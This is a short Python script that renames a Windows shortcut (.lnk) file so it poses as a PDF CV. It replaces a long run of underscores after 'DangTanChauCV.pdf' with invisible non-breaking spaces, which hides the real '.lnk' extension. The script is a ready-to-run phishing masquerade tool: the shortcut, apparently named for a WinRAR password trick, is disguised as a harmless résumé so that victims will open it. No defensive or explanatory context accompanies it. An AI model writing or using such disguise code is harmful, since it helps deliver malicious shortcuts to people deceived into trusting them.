import os
import random

HIDDEN_SPACES = [
    "\u00A0",
    # "\u200B",
    # "\u200C",
    # "\u200D",
    # "\u202F",
    # "\u205F",
]

def create_filename(name):
    result = []
    for ch in name:
        if ch == "_":
            count = random.randint(1, 3)
            result.append("".join(random.choice(HIDDEN_SPACES) for _ in range(count)))
        else:
            result.append(ch)
    return "".join(result)

def rename_file(filename1, filename2):
    try:
        filename2 = create_filename(filename2)
        print("Renaming '{}' to '{}'".format(filename1, filename2))
        os.rename(filename1, filename2)
        return filename2
    except Exception as e:
        print("Error:", e)
        return None


rename_file(
    "winrar_find_unzip_pass.lnk",
    "DangTanChauCV.pdf__________________________________________________________________________________.lnk"
)